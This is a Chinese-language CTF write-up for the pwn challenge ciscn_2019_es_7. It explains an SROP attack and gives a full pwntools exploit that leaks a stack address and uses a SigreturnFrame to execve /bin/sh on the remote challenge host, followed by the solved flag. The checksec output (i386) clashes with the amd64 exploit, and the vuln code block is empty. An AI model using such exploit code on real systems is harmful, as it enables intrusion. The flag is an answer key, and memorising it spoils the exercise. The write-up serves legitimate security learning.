# ciscn_2019_es_7

[题目地址](https://buuoj.cn/challenges#ciscn_2019_es_7)

新知识点：[srop](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/)。

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

基本没开什么东西。不过srop我之前从来没见过，看了[wp](https://blog.csdn.net/m0_57754423/article/details/123233030)才知道这是最简单和经典的srop。

main函数里只调用了vuln，那就直接看vuln吧。

```c
```

vuln里就调用了2个函数，结果出了2个问题。read明显栈溢出，write多打印了十几个字节，buf长度只有16却打印了0x30。配合read的栈溢出，我们先用一些填充填满buf，然后跟上一个栈上的地址。这样后面write打印时就能打印出那个栈上的运行地址，从而计算将来需要的偏移。

gadgets函数要看汇编才能看出东西。

```
                             undefined gadgets()
             undefined         AL:1           <RETURN>
                             gadgets                                         XREF[3]:     Entry Point(*), 004005e0, 
                                                                                          00400680(*)  
        004004d6 55              PUSH       RBP
        004004d7 48 89 e5        MOV        RBP,RSP
        004004da 48 c7 c0        MOV        RAX,0xf
                 0f 00 00 00
        004004e1 c3              RET
        004004e2 48 c7 c0        MOV        RAX,0x3b
                 3b 00 00 00
        004004e9 c3              RET
        004004ea 90              NOP
        004004eb 5d              POP        RBP
        004004ec c3              RET

```

最开始给的ctf wiki链接里讲得很详细了，直接看wp。虽然srop相较平常的rop payload更为繁琐，但是pwntools已经集成了工具[SigreturnFrame](https://docs.pwntools.com/en/stable/rop/srop.html)。另一个更加详细的讲解参照这篇[wp](https://blog.csdn.net/mcmuyanga/article/details/112509274)。

```python
from pwn import *
 
context(arch='amd64', os='linux', log_level='debug')
 
file_name = './es_7'
 
debug = 1
if debug:
    r = remote('node4.buuoj.cn', 28068)
else:
    r = process(file_name)
 
 
def dbg():
    gdb.attach(r)
 
vuln = 0x04004ED
 
p1 = b'a' * 0x10 + p64(vuln)   #泄露地址，顺便获得执行漏洞的第二次机会
r.sendline(p1)
stack_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
success('stack_addr = ' + hex(stack_addr))
 
#buf_addr = stack_addr - 0x128
buf_addr = stack_addr - 0x118   #泄露地址是为了找到buf_addr，也就是存着/bin/sh的地址。偏移值通过调试得出
success('buf_addr = ' + hex(buf_addr))
 
syscall_ret = 0x400517   #srop必须要一个syscall
sigret = 0x4004DA  #srop必须要sigreturn，不过把rax设置为0xf再syscall也是一样的效果，这里便是MOV RAX,0xf的gadget
 
sigframe = SigreturnFrame()  #构造Signal Frame。
sigframe.rax = constants.SYS_execve
sigframe.rdi = buf_addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

p1 = b'/bin/sh' + b'\x00' * (0x1 + 0x8)  #这里正好16个字节，填充完buf
p1 += p64(sigret) + p64(syscall_ret) + bytes(sigframe)  #srop公式，sigret+syscall_ret+sigfram
 
r.send(p1)
 
r.interactive()
```

## Flag
> flag{b4e76e8e-e500-47bf-9e79-9f2494a737fc}